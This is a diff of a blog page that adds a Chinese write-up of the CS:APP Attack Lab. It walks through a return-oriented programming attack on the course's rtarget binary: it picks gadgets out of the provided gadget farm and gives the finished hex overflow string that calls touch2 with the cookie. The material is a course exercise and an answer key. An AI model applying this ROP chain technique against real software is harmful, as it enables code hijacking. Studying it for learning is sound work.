@@ -162,6 +162,21 @@
     <article id="post-lab3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/16/lab3/">深入理解计算机系统</a>
+    </h1>
+  
+
+        
+        <a href="/2019/03/16/lab3/" class="archive-article-date">
+  	<time datetime="2019-03-16T08:08:25.439Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-16</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="lab3-Attack-lab"><a href="#lab3-Attack-lab" class="headerlink" title="lab3 Attack lab"></a>lab3 Attack lab</h1><hr>
@@ -178,9 +193,76 @@
 <hr>
 <p>###Part1</p>
 <p>###Part2</p>
-<h2 id="Part3"><a href="#Part3" class="headerlink" title="###Part3"></a>###Part3</h2><p>##ROP攻击<br>我们可以发现程序运行时如果没有合适的堆栈保护机制会使得攻击变得异常的轻松。</p>
+<p>###Part3</p>
+<hr>
+<p>##ROP攻击<br>我们可以发现程序运行时如果没有合适的堆栈保护机制会使得攻击变得异常的轻松。</p>
 <p>面对这种情况rtarget做出的对堆栈的保护机制：<br>1.每次为程序分配堆栈段的地址是任意的，无法提前检查出。<br>2.PC无法执行堆栈段中的程序，如果运行便会报错，并终止程序的运行。</p>
 <p>面对这种情况，我们对程序代码进行重构，引导PC在已有程序中跳转，以将PC引导到我们的目标攻击文件中去。</p>
+<p>我们应注意二进制文件中，是否含有对我们有利的或有帮助的信息，并注意记录下来他们的地址，关注如下的命令是否存在：</p>
+<p><img src="http://tu.027cgb.com/618037/mov.png" alt="mov"><br><img src="http://tu.027cgb.com/618037/BC.png" alt="BC"><br><img src="http://tu.027cgb.com/618037/D.png" alt="D"><br>还有90——为空指令<br>c3——返回指令</p>
+<p>###Part4<br>这道题目要求我们将rtarget引导入touch2(cookie)函数，主函数所调用的函数如下：</p>
+<pre><code>0000000000401994 &lt;start_farm&gt;:
+  401994:    b8 01 00 00 00           mov    $0x1,%eax
+  401999:    c3                       retq   
+
+000000000040199a &lt;getval_142&gt;:
+  40199a:    b8 fb 78 90 90           mov    $0x909078fb,%eax
+  40199f:    c3                       retq   
+
+00000000004019a0 &lt;addval_273&gt;:
+  4019a0:    8d 87 48 89 c7 c3        lea    -0x3c3876b8(%rdi),%eax
+  4019a6:    c3                       retq   
+
+00000000004019a7 &lt;addval_219&gt;:
+  4019a7:    8d 87 51 73 58 90        lea    -0x6fa78caf(%rdi),%eax
+  4019ad:    c3                       retq   
+
+00000000004019ae &lt;setval_237&gt;:
+  4019ae:    c7 07 48 89 c7 c7        movl   $0xc7c78948,(%rdi)
+  4019b4:    c3                       retq   
+
+00000000004019b5 &lt;setval_424&gt;:
+  4019b5:    c7 07 54 c2 58 92        movl   $0x9258c254,(%rdi)
+  4019bb:    c3                       retq   
+
+00000000004019bc &lt;setval_470&gt;:
+  4019bc:    c7 07 63 48 8d c7        movl   $0xc78d4863,(%rdi)
+  4019c2:    c3                       retq   
+
+00000000004019c3 &lt;setval_426&gt;:
+  4019c3:    c7 07 48 89 c7 90        movl   $0x90c78948,(%rdi)
+  4019c9:    c3                       retq   
+
+00000000004019ca &lt;getval_280&gt;:
+  4019ca:    b8 29 58 90 c3           mov    $0xc3905829,%eax
+  4019cf:    c3                       retq   
+
+00000000004019d0 &lt;mid_farm&gt;:
+  4019d0:    b8 01 00 00 00           mov    $0x1,%eax
+  4019d5:    c3                       retq
+</code></pre><p>分析代码时，我们要着重注意左侧的二进制代码，并从中提取出对我们有用的信息。</p>
+<p>ok我们现在先来分析一下我们需要什么代码：</p>
+<p>1.通过堆栈溢出保存我们的cookie<br>2.将cookie传入rdi中<br>3.调用touch2()函数</p>
+<p>如何才能保存cookie值呢？<br>我们的cookie值保存在堆栈中，所以要将参数传到寄存器中需要popq指令，还需要将代码返回所以还需要ret指令，所以我们要寻找二进制为5_ c3 的字段，<br>注意地址4019a7：和他的下一行含有58 90 c3 ，意思为：</p>
+<pre><code>popq %rax 
+nop 
+ret 
+</code></pre><p>将堆栈pop道rax中，并且暂停一次，之后返回，符合我们的要求，所以记录他的起始地址：4019ab</p>
+<p>观察地址4019a0:含有48 89 c7 c3，可以翻译为：</p>
+<pre><code>movq %rax,%rdi
+ret
+</code></pre><p>所以应该记录该地址4019a2<br>最后查找touch2函数的地址：4017ec<br>最后在注入的代码中加入cookie<br>所以最后结果如下：</p>
+<pre><code>00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+</code></pre><p>执行后的结果：<br><img src="http://tu.027cgb.com/618037/lab3result4.png" alt="result"></p>
+<p>###Part5</p>
 
       
 
@@ -249,7 +331,7 @@
 <ul>
 <li>lab1 : Data lab</li>
 <li>lab2 : Bomb lab</li>
-<li>lab3 : Attack lab</li>
+<li>lab3 : <a href>Attack lab</a></li>
 </ul>
 </blockquote>
 
@@ -260,6 +342,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">cs:app</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -385,6 +478,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">cs:app</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
